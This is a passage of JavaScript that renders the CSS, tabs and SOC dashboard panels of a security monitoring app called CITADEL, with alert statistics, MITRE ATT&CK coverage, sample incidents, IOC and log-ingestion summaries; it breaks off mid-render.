      '.ct-sel:focus{border-color:var(--acc);outline:none}' +
      '.ct-inp{background:rgba(0,0,0,.3);color:var(--txt);border:1px solid var(--line);padding:6px 10px;border-radius:3px;font-size:.72rem;font-family:inherit;width:100%;box-sizing:border-box}' +
      '.ct-inp:focus{border-color:var(--acc);outline:none}' +
      '.ct-textarea{background:rgba(0,0,0,.3);color:var(--txt);border:1px solid var(--line);padding:8px 10px;border-radius:3px;font-size:.72rem;font-family:inherit;width:100%;box-sizing:border-box;resize:vertical;min-height:80px}' +
      '.ct-textarea:focus{border-color:var(--acc);outline:none}' +
      '.ct-tbl{width:100%;border-collapse:collapse;font-size:.72rem}' +
      '.ct-tbl th{padding:6px 8px;text-align:left;color:var(--mut);border-bottom:2px solid var(--line);font-weight:600;letter-spacing:.03em;text-transform:uppercase;font-size:.62rem}' +
      '.ct-tbl td{padding:6px 8px;border-bottom:1px solid var(--line)}' +
      '.ct-tbl tr:hover{background:rgba(255,255,255,.02)}' +
      '.ct-tbl tr.clickable{cursor:pointer}' +
      '.ct-badge{display:inline-block;padding:2px 8px;border-radius:2px;font-size:.6rem;font-weight:600;letter-spacing:.03em;text-transform:uppercase}' +
      '.ct-crit{background:rgba(255,23,68,.15);color:#ff1744;border:1px solid rgba(255,23,68,.3)}' +
      '.ct-high{background:rgba(255,145,0,.15);color:#ff9100;border:1px solid rgba(255,145,0,.3)}' +
      '.ct-med{background:rgba(255,214,0,.15);color:#ffd600;border:1px solid rgba(255,214,0,.3)}' +
      '.ct-low{background:rgba(0,230,118,.15);color:#00e676;border:1px solid rgba(0,230,118,.3)}' +
      '.ct-info{background:rgba(0,229,255,.15);color:#00e5ff;border:1px solid rgba(0,229,255,.3)}' +
      '.ct-new{background:rgba(33,150,243,.15);color:#2196f3;border:1px solid rgba(33,150,243,.3)}' +
      '.ct-inv{background:rgba(255,145,0,.15);color:#ff9100;border:1px solid rgba(255,145,0,.3)}' +
      '.ct-esc{background:rgba(255,23,68,.15);color:#ff1744;border:1px solid rgba(255,23,68,.3)}' +
      '.ct-res{background:rgba(0,230,118,.15);color:#00e676;border:1px solid rgba(0,230,118,.3)}' +
      '.ct-feed-item{padding:6px 0;border-bottom:1px solid var(--line);font-size:.7rem;display:flex;gap:8px;align-items:flex-start}' +
      '.ct-feed-time{color:var(--mut);white-space:nowrap;font-size:.62rem;min-width:60px}' +
      '.ct-heatmap{display:grid;grid-template-columns:repeat(24,1fr);gap:2px}' +
      '.ct-heat-cell{aspect-ratio:1;border-radius:2px;font-size:.5rem;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .15s}' +
      '.ct-heat-cell:hover{transform:scale(1.3);z-index:2}' +
      '.ct-log-line{padding:4px 8px;font-size:.68rem;font-family:inherit;border-bottom:1px solid rgba(255,255,255,.03);display:flex;gap:8px;cursor:pointer;transition:background .1s}' +
      '.ct-log-line:hover{background:rgba(255,255,255,.04)}' +
      '.ct-log-line.selected{background:rgba(0,229,255,.08);border-left:2px solid var(--acc)}' +
      '.ct-log-ts{color:var(--mut);white-space:nowrap;min-width:80px;font-size:.6rem}' +
      '.ct-log-src{color:var(--acc);min-width:100px;font-size:.62rem}' +
      '.ct-log-msg{flex:1;word-break:break-all;white-space:pre-wrap}' +
      '.ct-log-detail{background:rgba(0,0,0,.3);border:1px solid var(--line);border-radius:4px;padding:12px;margin:8px 0;font-size:.68rem;white-space:pre-wrap;max-height:300px;overflow-y:auto}' +
      '.ct-gauge{position:relative;height:8px;background:var(--line);border-radius:4px;overflow:hidden}' +
      '.ct-gauge-fill{height:100%;border-radius:4px;transition:width .5s}' +
      '.ct-trend{display:flex;align-items:flex-end;gap:2px;height:40px}' +
      '.ct-trend-bar{flex:1;background:var(--acc);border-radius:2px 2px 0 0;transition:height .3s;min-width:8px}' +
      '.ct-rule-card{background:var(--card);border:1px solid var(--line);border-radius:4px;padding:12px;cursor:pointer;transition:border-color .2s}' +
      '.ct-rule-card:hover{border-color:var(--acc)}' +
      '.ct-rule-card.selected{border-color:var(--acc);box-shadow:0 0 8px color-mix(in srgb,var(--acc) 20%,transparent)}' +
      '.ct-yaml{background:rgba(0,0,0,.4);border:1px solid var(--line);border-radius:4px;padding:12px;font-size:.65rem;font-family:inherit;white-space:pre-wrap;overflow-x:auto;max-height:400px;overflow-y:auto;line-height:1.5}' +
      '.ct-yaml .kw{color:#ff9100}' +
      '.ct-yaml .str{color:#00e676}' +
      '.ct-yaml .num{color:#00e5ff}' +
      '.ct-corr-flow{display:flex;align-items:center;gap:4px;flex-wrap:wrap;padding:8px 0}' +
      '.ct-corr-event{background:rgba(0,0,0,.3);border:1px solid var(--line);border-radius:4px;padding:6px 10px;font-size:.62rem;font-weight:600}' +
      '.ct-corr-arrow{color:var(--mut);font-size:1rem}' +
      '.ct-corr-window{background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.3);border-radius:10px;padding:2px 8px;font-size:.55rem;color:#00e5ff}' +
      '.ct-compliance-bar{display:flex;gap:4px;margin-bottom:12px}' +
      '.ct-compliance-btn{background:transparent;border:1px solid var(--line);color:var(--mut);padding:6px 14px;font-size:.65rem;font-weight:600;border-radius:3px;cursor:pointer;font-family:inherit;transition:all .15s}' +
      '.ct-compliance-btn.on{border-color:var(--acc);color:var(--acc);background:rgba(0,229,255,.08)}' +
      '.ct-score-ring{position:relative;width:100px;height:100px;margin:0 auto}' +
      '.ct-scanline{position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--acc),transparent);opacity:.15;animation:ct-scan 6s linear infinite;pointer-events:none}' +
      '@keyframes ct-scan{0%{transform:translateY(0)}100%{transform:translateY(600px)}}' +
      '.ct-timeline{position:relative;padding-left:24px}' +
      '.ct-timeline::before{content:"";position:absolute;left:8px;top:0;bottom:0;width:2px;background:var(--line)}' +
      '.ct-tl-item{position:relative;padding:8px 0 8px 16px;font-size:.7rem}' +
      '.ct-tl-item::before{content:"";position:absolute;left:-20px;top:12px;width:10px;height:10px;border-radius:50%;background:var(--acc);border:2px solid var(--bg)}' +
      '.ct-tl-time{color:var(--mut);font-size:.6rem}' +
      '.ct-filter-row{display:flex;gap:8px;align-items:center;padding:8px 0;flex-wrap:wrap}' +
      '.ct-tag{display:inline-block;padding:1px 6px;border-radius:2px;font-size:.55rem;font-weight:600;background:rgba(0,229,255,.1);color:#00e5ff;border:1px solid rgba(0,229,255,.2)}' +
      '.ct-analyst{display:flex;align-items:center;gap:8px;padding:8px;border:1px solid var(--line);border-radius:4px;background:rgba(0,0,0,.1)}' +
      '.ct-analyst-avatar{width:28px;height:28px;border-radius:50%;background:var(--acc);display:flex;align-items:center;justify-content:center;font-size:.65rem;font-weight:700;color:var(--bg)}' +
      '.ct-mitre-matrix{display:flex;gap:2px;overflow-x:auto}' +
      '.ct-mitre-col{flex:1;min-width:65px}' +
      '.ct-mitre-header{font-size:.5rem;font-weight:600;text-align:center;padding:4px 2px;background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.2);border-radius:2px;margin-bottom:2px;color:var(--acc)}' +
      '.ct-mitre-tech{font-size:.45rem;text-align:center;padding:3px 1px;border:1px solid var(--line);border-radius:1px;margin-bottom:1px;cursor:pointer;transition:all .15s}' +
      '.ct-mitre-tech:hover{border-color:var(--acc);z-index:2}' +
      '.ct-mitre-tech.active{background:rgba(255,23,68,.2);border-color:#ff1744;color:#ff1744}' +
      '.ct-mitre-tech.detected{background:rgba(255,145,0,.15);border-color:rgba(255,145,0,.3);color:#ff9100}' +
      '.ct-mitre-tech.covered{background:rgba(0,230,118,.08);border-color:rgba(0,230,118,.15);color:#00e676}' +
      '.ct-ioc-card{background:rgba(0,0,0,.15);border:1px solid var(--line);border-radius:4px;padding:8px;margin-bottom:4px;font-size:.62rem;transition:border-color .2s}' +
      '.ct-ioc-card:hover{border-color:var(--acc)}' +
      '.ct-playbook-step{display:flex;gap:8px;align-items:flex-start;padding:6px 0;border-bottom:1px solid var(--line)}' +
      '.ct-playbook-num{width:22px;height:22px;border-radius:50%;background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.3);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:.55rem;font-weight:600;color:var(--acc)}' +
      '.ct-pipeline-row{display:flex;gap:6px;align-items:center;padding:6px 0;border-bottom:1px solid var(--line);font-size:.62rem}' +
      '.ct-pipeline-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}' +
      '.ct-actor-card{padding:10px;border:1px solid var(--line);border-radius:4px;background:rgba(0,0,0,.1);margin-bottom:6px;transition:border-color .2s}' +
      '.ct-actor-card:hover{border-color:var(--acc)}' +
      '.ct-check-item{display:flex;align-items:center;gap:6px;padding:3px 0;font-size:.62rem}' +
      '.ct-check-box{width:14px;height:14px;border:1px solid var(--line);border-radius:2px;flex-shrink:0;cursor:pointer;transition:all .15s}' +
      '.ct-check-box:hover{border-color:var(--acc)}' +
      '.ct-check-box.checked{background:var(--acc);border-color:var(--acc)}' +
      '.ct-field-row{display:flex;gap:4px;padding:2px 0;font-size:.6rem}' +
      '.ct-field-key{color:var(--acc);min-width:100px;font-weight:600}' +
      '.ct-field-val{color:var(--txt);flex:1;word-break:break-all}' +
      '.ct-sparkline{display:flex;align-items:flex-end;gap:1px;height:20px}' +
      '.ct-spark-bar{flex:1;background:var(--acc);border-radius:1px 1px 0 0;min-width:3px;transition:height .3s}' +
      '.ct-status-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}' +
      '.ct-status-dot.healthy{background:#00e676;box-shadow:0 0 4px #00e676}' +
      '.ct-status-dot.warning{background:#ffd600;box-shadow:0 0 4px #ffd600}' +
      '.ct-status-dot.critical{background:#ff1744;box-shadow:0 0 4px #ff1744}' +
      '.ct-status-dot.degraded{background:#ff9100;box-shadow:0 0 4px #ff9100}' +
      '.ct-evidence-tag{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:2px;font-size:.55rem;font-weight:600;background:rgba(0,229,255,.08);border:1px solid rgba(0,229,255,.15);color:#00e5ff}' +
      '.ct-severity-strip{height:4px;border-radius:2px;margin-top:4px}' +
      '.ct-severity-strip.s-crit{background:linear-gradient(90deg,#ff1744,rgba(255,23,68,.3))}' +
      '.ct-severity-strip.s-high{background:linear-gradient(90deg,#ff9100,rgba(255,145,0,.3))}' +
      '.ct-severity-strip.s-med{background:linear-gradient(90deg,#ffd600,rgba(255,214,0,.3))}' +
      '.ct-severity-strip.s-low{background:linear-gradient(90deg,#00e676,rgba(0,230,118,.3))}' +
      '.ct-code-block{background:rgba(0,0,0,.4);border:1px solid var(--line);border-radius:4px;padding:10px;font-size:.62rem;font-family:inherit;white-space:pre-wrap;overflow-x:auto;line-height:1.5}' +
      '.ct-code-block .keyword{color:#ff9100}' +
      '.ct-code-block .string{color:#00e676}' +
      '.ct-code-block .number{color:#00e5ff}' +
      '.ct-code-block .comment{color:var(--mut);font-style:italic}' +
      '.ct-tabs-mini{display:flex;gap:2px;margin-bottom:8px}' +
      '.ct-tab-mini{background:transparent;border:1px solid var(--line);color:var(--mut);padding:4px 10px;font-size:.6rem;font-weight:600;border-radius:2px;cursor:pointer;font-family:inherit;transition:all .15s}' +
      '.ct-tab-mini.on{border-color:var(--acc);color:var(--acc);background:rgba(0,229,255,.08)}' +
      '.ct-progress{display:flex;gap:2px;margin-top:4px}' +
      '.ct-progress-seg{height:4px;flex:1;border-radius:2px;background:var(--line)}' +
      '.ct-progress-seg.filled{background:var(--acc)}' +
      '.ct-progress-seg.warn{background:#ff9100}' +
      '.ct-progress-seg.crit{background:#ff1744}' +
      '.ct-divider{border:none;border-top:1px solid var(--line);margin:12px 0}' +
      '.ct-empty{text-align:center;padding:30px;color:var(--mut);font-size:.72rem}' +
      '.ct-alert-row{display:flex;gap:6px;align-items:center;padding:6px 0;border-bottom:1px solid var(--line);font-size:.65rem;cursor:pointer;transition:background .1s}' +
      '.ct-alert-row:hover{background:rgba(255,255,255,.02)}' +
      '.ct-sev-indicator{width:4px;height:100%;min-height:24px;border-radius:2px;flex-shrink:0}' +
      '@media(max-width:768px){.ct-grid2{grid-template-columns:1fr}.ct-grid3{grid-template-columns:1fr}.ct-heatmap{grid-template-columns:repeat(12,1fr)}.ct-tabs{flex-wrap:wrap}.ct-mitre-matrix{flex-direction:column}}' +
      '</style>' +
      '<div class="ct-wrap">' +
        '<div class="ct-scanline"></div>' +
        '<div class="ct-header">' +
          '<h1 class="ct-title">CITADEL</h1>' +
          '<div class="ct-dot"></div>' +
          '<span class="ct-sub">Centralized Intelligence Triage And Detection Engine Lab</span>' +
          '<span style="flex:1"></span>' +
          '<span class="ct-sub" style="color:var(--acc)">SOC OPERATIONAL</span>' +
        '</div>' +
        '<div class="ct-tabs">' +
          ['dashboard:SOC Dashboard','logs:Log Explorer','correlation:Correlation Engine','detection:Detection Rules','triage:Alert Triage','hunt:Threat Hunt','compliance:Compliance','metrics:Metrics'].map(function(t) {
            var p = t.split(':');
            return '<button class="ct-tab' + (activeTab === p[0] ? ' on' : '') + '" data-t="' + p[0] + '">' + p[1] + '</button>';
          }).join('') +
        '</div>' +
        '<div id="ct-content" style="margin-top:10px"></div>' +
      '</div>';

    main.querySelector('.ct-tabs').onclick = function(e) {
      var b = e.target.closest('.ct-tab');
      if (b) { activeTab = b.dataset.t; render(); }
    };

    var content = main.querySelector('#ct-content');
    if (activeTab === 'dashboard') renderDashboard(content);
    else if (activeTab === 'logs') renderLogExplorer(content);
    else if (activeTab === 'correlation') renderCorrelation(content);
    else if (activeTab === 'detection') renderDetection(content);
    else if (activeTab === 'triage') renderTriage(content);
    else if (activeTab === 'hunt') renderHunt(content);
    else if (activeTab === 'compliance') renderComplianceTab(content);
    else if (activeTab === 'metrics') renderMetrics(content);
  }

  // ========== SOC DASHBOARD ==========
  function renderDashboard(c) {
    var crit = ALERTS.filter(function(a){return a.severity==='Critical'});
    var high = ALERTS.filter(function(a){return a.severity==='High'});
    var med = ALERTS.filter(function(a){return a.severity==='Medium'});
    var open = ALERTS.filter(function(a){return a.status!=='Resolved'});
    var investigating = ALERTS.filter(function(a){return a.status==='Investigating'});
    var escalated = ALERTS.filter(function(a){return a.status==='Escalated'});
    var newAlerts = ALERTS.filter(function(a){return a.status==='New'});

    var hours = [];
    for (var h = 0; h < 24; h++) {
      var hc = {crit:0,high:0,med:0,low:0};
      ALERTS.forEach(function(a) {
        var ah = new Date(a.timestamp).getUTCHours();
        if (ah === h) {
          if (a.severity==='Critical') hc.crit++;
          else if (a.severity==='High') hc.high++;
          else if (a.severity==='Medium') hc.med++;
          else hc.low++;
        }
      });
      hours.push(hc);
    }

    c.innerHTML =
      '<div class="ct-grid4" style="margin-bottom:12px">' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff1744">' + crit.length + '</div><div class="ct-stat-l">Critical</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff9100">' + high.length + '</div><div class="ct-stat-l">High</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#ffd600">' + med.length + '</div><div class="ct-stat-l">Medium</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e676">' + open.length + '</div><div class="ct-stat-l">Open Alerts</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e5ff">' + SOC_METRICS.mttd.current + '<span style="font-size:.6rem">m</span></div><div class="ct-stat-l">MTTD</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e5ff">' + SOC_METRICS.mttr.current + '<span style="font-size:.6rem">m</span></div><div class="ct-stat-l">MTTR</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v">' + SOC_METRICS.falsePositiveRate.current + '<span style="font-size:.6rem">%</span></div><div class="ct-stat-l">False Positive Rate</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v">' + ALERTS.length + '</div><div class="ct-stat-l">Total Alerts (24h)</div></div>' +
      '</div>' +

      '<div class="ct-grid2" style="margin-bottom:12px">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Severity Heatmap (24h)</div>' +
          '<div class="ct-panel-b">' +
            '<div style="display:flex;gap:4px;margin-bottom:6px;font-size:.55rem;color:var(--mut)">' +
              Array.from({length:24},function(_,i){return '<div style="flex:1;text-align:center">'+(i<10?'0':'')+i+'</div>';}).join('') +
            '</div>' +
            '<div class="ct-heatmap">' +
              hours.map(function(h,i) {
                var total = h.crit + h.high + h.med + h.low;
                var color = h.crit > 0 ? 'rgba(255,23,68,.7)' : h.high > 0 ? 'rgba(255,145,0,.5)' : h.med > 0 ? 'rgba(255,214,0,.3)' : total > 0 ? 'rgba(0,230,118,.2)' : 'rgba(255,255,255,.03)';
                return '<div class="ct-heat-cell" style="background:' + color + '" title="' + (i<10?'0':'')+i + ':00 - C:' + h.crit + ' H:' + h.high + ' M:' + h.med + '">' + (total || '') + '</div>';
              }).join('') +
            '</div>' +
            '<div style="display:flex;gap:12px;margin-top:6px;font-size:.55rem;color:var(--mut)">' +
              '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(255,23,68,.7);border-radius:2px;vertical-align:middle"></span> Critical</span>' +
              '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(255,145,0,.5);border-radius:2px;vertical-align:middle"></span> High</span>' +
              '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(255,214,0,.3);border-radius:2px;vertical-align:middle"></span> Medium</span>' +
              '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(0,230,118,.2);border-radius:2px;vertical-align:middle"></span> Low</span>' +
            '</div>' +
          '</div>' +
        '</div>' +

        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Alert Sources</div>' +
          '<div class="ct-panel-b">' +
            SOC_METRICS.topSources.map(function(s) {
              var pct = Math.round((s.count / SOC_METRICS.alertVolume.today) * 100);
              return '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;font-size:.68rem">' +
                '<span style="min-width:50px;color:var(--mut)">' + esc(s.name) + '</span>' +
                '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + pct + '%;background:var(--acc)"></div></div>' +
                '<span style="min-width:30px;text-align:right;font-weight:600">' + s.count + '</span>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-grid2" style="margin-bottom:12px">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Live Alert Feed</div>' +
          '<div class="ct-panel-b" style="max-height:280px;overflow-y:auto">' +
            ALERTS.slice(0,15).map(function(a) {
              var sevClass = a.severity==='Critical'?'ct-crit':a.severity==='High'?'ct-high':a.severity==='Medium'?'ct-med':'ct-low';
              var statusClass = a.status==='New'?'ct-new':a.status==='Investigating'?'ct-inv':a.status==='Escalated'?'ct-esc':'ct-res';
              return '<div class="ct-feed-item">' +
                '<span class="ct-feed-time">' + new Date(a.timestamp).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:false}) + '</span>' +
                '<span class="ct-badge ' + sevClass + '">' + esc(a.severity) + '</span>' +
                '<span style="flex:1">' + esc(a.title) + '</span>' +
                '<span class="ct-badge ' + statusClass + '">' + esc(a.status) + '</span>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +

        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Analyst Board</div>' +
          '<div class="ct-panel-b">' +
            SOC_METRICS.analystLoad.map(function(a) {
              return '<div class="ct-analyst" style="margin-bottom:6px">' +
                '<div class="ct-analyst-avatar">' + esc(a.name.charAt(a.name.length-1)) + '</div>' +
                '<div style="flex:1">' +
                  '<div style="font-size:.72rem;font-weight:600">' + esc(a.name) + '</div>' +
                  '<div style="font-size:.6rem;color:var(--mut)">Open: ' + a.open + ' | Closed: ' + a.closed + ' | Avg: ' + a.avgTime + 'm</div>' +
                '</div>' +
                '<div class="ct-gauge" style="width:80px"><div class="ct-gauge-fill" style="width:' + Math.min(100,Math.round(a.open/30*100)) + '%;background:' + (a.open>20?'#ff1744':a.open>15?'#ff9100':'#00e676') + '"></div></div>' +
              '</div>';
            }).join('') +
            '<div style="margin-top:10px">' +
              '<div class="ct-panel-h" style="border:none;padding:4px 0">Current Shift</div>' +
              SOC_METRICS.shifts.map(function(s) {
                return '<div style="display:flex;justify-content:space-between;font-size:.65rem;padding:3px 0;border-bottom:1px solid var(--line)">' +
                  '<span>' + esc(s.shift) + '</span>' +
                  '<span style="color:var(--mut)">' + s.analysts.join(', ') + '</span>' +
                  '<span style="color:var(--acc)">' + s.alerts + ' alerts</span>' +
                '</div>';
              }).join('') +
            '</div>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-grid2" style="margin-bottom:12px">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Top MITRE ATT&CK Techniques</div>' +
          '<div class="ct-panel-b">' +
            '<div style="display:flex;gap:8px;flex-wrap:wrap">' +
              SOC_METRICS.topMitre.map(function(m) {
                return '<div class="ct-stat" style="min-width:120px">' +
                  '<div style="font-size:.62rem;color:var(--acc);font-weight:600">' + esc(m.id) + '</div>' +
                  '<div style="font-size:.68rem;margin-top:2px">' + esc(m.name) + '</div>' +
                  '<div style="font-size:1rem;font-weight:700;margin-top:4px">' + m.count + '</div>' +
                '</div>';
              }).join('') +
            '</div>' +
          '</div>' +
        '</div>' +

        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Active Kill Chain Coverage</div>' +
          '<div class="ct-panel-b">' +
            ['Reconnaissance:2:#ffd600','Initial Access:3:#ff9100','Execution:5:#ff1744','Persistence:3:#ff1744','Priv Escalation:2:#ff9100','Defense Evasion:2:#ff1744','Credential Access:4:#ff1744','Discovery:3:#ff9100','Lateral Movement:2:#ff9100','Collection:1:#ffd600','Exfiltration:1:#ff1744','C2:3:#ff1744'].map(function(s) {
              var p = s.split(':');
              var w = Math.min(100, parseInt(p[1]) * 15);
              return '<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;font-size:.62rem">' +
                '<span style="min-width:100px;color:var(--mut)">' + p[0] + '</span>' +
                '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + w + '%;background:' + p[2] + '"></div></div>' +
                '<span style="min-width:20px;text-align:right;font-weight:600;color:' + p[2] + '">' + p[1] + '</span>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-bottom:12px">' +
        '<div class="ct-panel-h" style="color:#ff1744">Active Incidents</div>' +
        '<div class="ct-panel-b">' +
          '<table class="ct-tbl">' +
            '<thead><tr><th>Incident</th><th>Title</th><th>Severity</th><th>Status</th><th>Lead</th><th>Started</th><th>Affected Assets</th></tr></thead>' +
            '<tbody>' +
              '<tr><td style="color:var(--acc);font-weight:600">INC-001</td><td>Cobalt Strike C2 on WS-JSMITH-01</td><td><span class="ct-badge ct-crit">Critical</span></td><td><span class="ct-badge ct-inv">Containment</span></td><td>Analyst-1</td><td>08:07:00</td><td>WS-JSMITH-01, DC-01, FS-01</td></tr>' +
              '<tr><td style="color:var(--acc);font-weight:600">INC-002</td><td>Data Exfiltration via HTTPS</td><td><span class="ct-badge ct-crit">Critical</span></td><td><span class="ct-badge ct-esc">Escalated</span></td><td>Analyst-2</td><td>08:41:00</td><td>10.0.2.100, FS-01</td></tr>' +
              '<tr><td style="color:var(--acc);font-weight:600">INC-003</td><td>AWS IAM Backdoor User Created</td><td><span class="ct-badge ct-crit">Critical</span></td><td><span class="ct-badge ct-new">Triage</span></td><td>Unassigned</td><td>08:16:00</td><td>AWS Account, S3:sensitive-data-prod</td></tr>' +
              '<tr><td style="color:var(--acc);font-weight:600">INC-004</td><td>Ransomware Activity on 10.0.2.150</td><td><span class="ct-badge ct-crit">Critical</span></td><td><span class="ct-badge ct-inv">Investigating</span></td><td>Analyst-2</td><td>08:28:00</td><td>10.0.2.150, network shares</td></tr>' +
            '</tbody>' +
          '</table>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel">' +
        '<div class="ct-panel-h">Alert Volume by Day (Last 7 Days)</div>' +
        '<div class="ct-panel-b">' +
          '<div class="ct-trend" style="height:80px">' +
            SOC_METRICS.alertVolume.week.map(function(v,i) {
              var h = Math.round((v / Math.max.apply(null,SOC_METRICS.alertVolume.week)) * 100);
              var days = ['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];
              return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">' +
                '<div style="font-size:.55rem;color:var(--mut)">' + v + '</div>' +
                '<div style="flex:1;width:100%;display:flex;align-items:flex-end"><div class="ct-trend-bar" style="height:' + h + '%;width:100%"></div></div>' +
                '<div style="font-size:.5rem;color:var(--mut)">' + days[i] + '</div>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">MITRE ATT&CK Heat Map</div>' +
        '<div class="ct-panel-b" style="overflow-x:auto">' +
          '<div style="display:flex;gap:2px;min-width:900px">' +
            MITRE_MATRIX.map(function(tac) {
              var coveredCount = tac.techniques.filter(function(t){return t.covered}).length;
              var totalAlerts = tac.techniques.reduce(function(s,t){return s+t.alerts},0);
              return '<div style="flex:1;min-width:60px">' +
                '<div style="font-size:.5rem;font-weight:600;text-align:center;padding:4px 2px;background:rgba(0,229,255,.1);border:1px solid rgba(0,229,255,.2);border-radius:2px;margin-bottom:2px;color:var(--acc)">' + esc(tac.tactic) + '</div>' +
                tac.techniques.map(function(tech) {
                  var bg = tech.alerts > 3 ? 'rgba(255,23,68,.5)' : tech.alerts > 0 ? 'rgba(255,145,0,.3)' : tech.covered ? 'rgba(0,230,118,.15)' : 'rgba(255,255,255,.03)';
                  var border = tech.alerts > 3 ? 'rgba(255,23,68,.5)' : tech.alerts > 0 ? 'rgba(255,145,0,.3)' : tech.covered ? 'rgba(0,230,118,.2)' : 'var(--line)';
                  return '<div style="font-size:.42rem;text-align:center;padding:3px 1px;background:' + bg + ';border:1px solid ' + border + ';border-radius:1px;margin-bottom:1px;cursor:pointer" title="' + esc(tech.id + ' ' + tech.name + (tech.alerts > 0 ? ' (' + tech.alerts + ' alerts)' : '')) + '">' + esc(tech.id.replace('T','')) + '</div>';
                }).join('') +
                '<div style="font-size:.45rem;text-align:center;color:var(--mut);margin-top:2px">' + coveredCount + '/' + tac.techniques.length + '</div>' +
              '</div>';
            }).join('') +
          '</div>' +
          '<div style="display:flex;gap:12px;margin-top:8px;font-size:.5rem;color:var(--mut)">' +
            '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(255,23,68,.5);border-radius:1px;vertical-align:middle"></span> Active (&gt;3 alerts)</span>' +
            '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(255,145,0,.3);border-radius:1px;vertical-align:middle"></span> Detected (1-3)</span>' +
            '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(0,230,118,.15);border-radius:1px;vertical-align:middle"></span> Covered (no alerts)</span>' +
            '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(255,255,255,.03);border:1px solid var(--line);border-radius:1px;vertical-align:middle"></span> No coverage</span>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-grid2" style="margin-top:12px">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">IOC Summary (' + IOC_DATABASE.length + ' indicators)</div>' +
          '<div class="ct-panel-b" style="max-height:250px;overflow-y:auto">' +
            IOC_DATABASE.slice(0,12).map(function(ioc) {
              var typeColor = ioc.type==='ip'?'#00e5ff':ioc.type==='domain'?'#ff9100':ioc.type==='hash'?'#7c4dff':ioc.type==='email'?'#e040fb':'#00e676';
              var classColor = ioc.classification==='Malicious'?'#ff1744':'#ffd600';
              return '<div style="display:flex;gap:6px;align-items:center;padding:4px 0;border-bottom:1px solid var(--line);font-size:.6rem">' +
                '<span class="ct-tag" style="background:' + typeColor + '22;color:' + typeColor + ';border-color:' + typeColor + '44;min-width:50px;text-align:center">' + ioc.type.toUpperCase() + '</span>' +
                '<span style="flex:1;font-family:inherit;word-break:break-all">' + esc(ioc.value) + '</span>' +
                '<span style="color:' + classColor + ';font-weight:600;font-size:.55rem">' + esc(ioc.classification) + '</span>' +
                '<span style="color:var(--mut);font-size:.5rem">' + ioc.confidence + '%</span>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +

        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Log Ingestion Pipeline</div>' +
          '<div class="ct-panel-b" style="max-height:250px;overflow-y:auto">' +
            INGESTION_PIPELINE.map(function(p) {
              var statusColor = p.status==='healthy'?'#00e676':p.status==='warning'?'#ffd600':'#ff1744';
              return '<div style="display:flex;gap:6px;align-items:center;padding:4px 0;border-bottom:1px solid var(--line);font-size:.6rem">' +
                '<span style="width:6px;height:6px;border-radius:50%;background:' + statusColor + ';flex-shrink:0"></span>' +
                '<span style="min-width:130px;font-weight:600">' + esc(p.source) + '</span>' +
                '<span style="min-width:50px;color:var(--mut)">' + p.format + '</span>' +
                '<span style="min-width:50px;color:var(--acc);font-weight:600">' + p.eps.toLocaleString() + ' EPS</span>' +
                '<span style="min-width:30px;color:var(--mut)">' + p.latency + '</span>' +
                '<span style="color:' + statusColor + ';font-weight:600;font-size:.5rem;text-transform:uppercase">' + p.status + '</span>' +
              '</div>';
            }).join('') +
            '<div style="display:flex;justify-content:space-between;margin-top:8px;font-size:.62rem;color:var(--mut);border-top:1px solid var(--line);padding-top:6px">' +
              '<span>Total EPS: <strong style="color:var(--acc)">' + INGESTION_PIPELINE.reduce(function(s,p){return s+p.eps},0).toLocaleString() + '</strong></span>' +
              '<span>Sources: <strong>' + INGESTION_PIPELINE.length + '</strong></span>' +
